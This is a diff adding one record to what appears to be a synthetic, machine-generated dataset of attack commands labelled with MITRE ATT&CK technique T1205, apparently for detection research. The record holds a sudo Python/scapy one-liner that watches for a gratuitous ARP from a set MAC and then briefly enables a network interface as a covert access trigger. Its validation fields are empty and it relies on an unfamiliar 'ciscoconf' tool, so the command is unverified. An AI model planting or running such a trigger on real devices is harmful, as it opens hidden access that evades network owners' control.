@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,ARP; import os; p=sniff(filter=\"arp\", lfilter=lambda x: x.haslayer(ARP) and x[ARP].psrc==x[ARP].pdst and x[ARP].hwsrc==\"66:77:88:99:aa:bb\", count=1)[0]; os.system(\"ciscoconf --apply \\\"interface GigabitEthernet0/1; no shutdown\\\" && (sleep 120; ciscoconf --apply \\\"interface GigabitEthernet0/1; shutdown\\\") &\")'",
+  "explanation": "Treats a gratuitous ARP from a specific MAC as a magic signal to bring up Gi0/1 for 2 minutes via ciscoconf. Requires sudo to sniff ARP frames.",
+  "rationale_steps": [
+    "Sniff ARP frames and identify gratuitous ARP (psrc==pdst) from a whitelisted MAC.",
+    "Enable the interface temporarily to allow management or lateral traffic.",
+    "No obfuscation; relies on ARP-based signaling channel.",
+    "Detection: monitor gratuitous ARP patterns and short-lived interface state changes in logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-e2fc14f6",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
